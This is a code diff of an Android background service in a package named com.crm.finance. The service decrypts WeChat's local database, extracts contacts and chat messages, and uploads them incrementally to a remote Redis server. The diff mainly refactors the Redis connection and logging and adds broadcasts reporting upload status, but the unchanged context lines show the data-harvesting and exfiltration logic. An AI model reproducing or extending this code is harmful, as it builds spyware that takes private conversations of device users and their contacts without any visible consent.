@@ -17,6 +17,7 @@ import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
+import com.crm.finance.broadcast.BroadcastManager;
 import com.crm.finance.dao.DevInfoDao;
 import com.crm.finance.dao.HeartCofigDao;
 import com.crm.finance.dao.ImgFlagDao;
@@ -334,7 +335,7 @@ public class GohnsonService extends Service {
                             dataTarget = SQLiteDatabase.openOrCreateDatabase(dbFile.getPath(), mDbPassword, null, hook);
                             uploadOperation(dataTarget, f, pathUin, wxIMEI, fileChangeTime);
                         } catch (Exception e) {
-                            String exceptionStr = "异常 ：上传数据信息失败:" + e.getMessage().toString() + ",filePath = " + (dbFile == null ? "" : dbFile.getPath());
+                            String exceptionStr = "异常 ：上传数据信息失败:" + e.getLocalizedMessage() + ",filePath = " + (dbFile == null ? "" : dbFile.getPath());
                             MyLog.inputLogToFile(TAG, exceptionStr);
                         } finally {
                             if (dataTarget != null)
@@ -411,7 +412,6 @@ public class GohnsonService extends Service {
 
         }
 
-
         String rcontactJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, rcontacts, pathUin, deviceID, userName);
         LogInputUtil.e(TAG, "待提交的rcontactJsonStr = " + rcontactJsonStr);
         boolean rcontactUploadSucceed = false;
@@ -442,6 +442,7 @@ public class GohnsonService extends Service {
             boolean dataUploadSucceed = false;
             ArrayList<Object> messages = WXDataFormJsonUtil.getMessageDataInDB(this, dataTarget, file);
             messages =  WXFileUtil.addSrcPath(wxFolderPath,messages);
+
 
             if (messages == null) continue;
             int listSize = messages.size();
@@ -529,8 +530,7 @@ public class GohnsonService extends Service {
         }
 
         try {
-            Jedis myJedis = new Jedis(GlobalCofig.REDIS_HOST, GlobalCofig.Port,10000);
-            myJedis.auth(GlobalCofig.REDIS_AUTH);
+            Jedis myJedis = JedisUtil.getInit();
             MyLog.inputLogToFile(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
             long pushValue = myJedis.lpush(key, jsonValue);
 
@@ -546,11 +546,9 @@ public class GohnsonService extends Service {
     public boolean uploadMessageDataToRedis(String key, String jsonValue, File file) {
 
         try {
-            Jedis myJedis = new Jedis(GlobalCofig.REDIS_HOST, GlobalCofig.Port,10000);
-            myJedis.auth(GlobalCofig.REDIS_AUTH);
+            Jedis myJedis = JedisUtil.getInit();
             MyLog.inputLogToFile(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
             long pushValue = myJedis.lpush(key, jsonValue);
-
 
             //上传成功去更新下标，下次从新下标开始取值
             String lastUploadTimeStr = GlobalCofig.MESSAGE_LAST_UPLOAD_TIME + file.getPath();
@@ -558,14 +556,27 @@ public class GohnsonService extends Service {
             long lastUploadTime = ShareData.getInstance().getLongValue(this, lastUploadTimeStr, 0);
             ShareData.getInstance().saveLongValue(this, lastUploadTimeStr, lastUploadTimeTemporary);
 
-            MyLog.inputLogToFile(TAG, key + "：redis 上传成功 ，message数据有更新， 新时间为= " + lastUploadTimeTemporary + ",旧时间 = " + lastUploadTime + ",pushValue = " + pushValue + ",filePath = " + file.getPath());
+            MyLog.inputLogToFile(TAG, key + "：redis 上传成功 ，message数据有更新，时间为= " + Utils.transForDate(lastUploadTimeTemporary) + "("+lastUploadTimeTemporary+"),旧时间 = "+Utils.transForDate(lastUploadTime) +"("+lastUploadTime+"),pushValue = " + pushValue + ",filePath = " + file.getPath());
+
+            sendDataUploadLog(lastUploadTimeTemporary,file.getPath());
             return true;
         } catch (Exception e) {
-            MyLog.inputLogToFile(TAG, key + ":redis 连接失败, errMsg = " + e.getMessage());
+            MyLog.inputLogToFile(TAG, key + ":redis 连接失败, errMsg = " + e.getLocalizedMessage());
+            sendDataUploadErrLog(e.getLocalizedMessage());
             return false;
         }
     }
-
+    public void sendDataUploadLog(long lastUploadTimeTemporary,String filePath){
+        Intent mIntent = new Intent();
+        mIntent.putExtra("time",lastUploadTimeTemporary);
+        mIntent.putExtra("filePath",filePath);
+        BroadcastManager.sendShowTopRankData(mIntent,GlobalCofig.BROADCAST_WRITE_LOG);
+    }
+    public void sendDataUploadErrLog(String ErrMsg){
+        Intent mIntent = new Intent();
+        mIntent.putExtra("ErrMsg",ErrMsg);
+        BroadcastManager.sendShowTopRankData(mIntent,GlobalCofig.BROADCAST_ERR_WRITE_LOG);
+    }
     @Override
     public void onDestroy() {
         super.onDestroy();
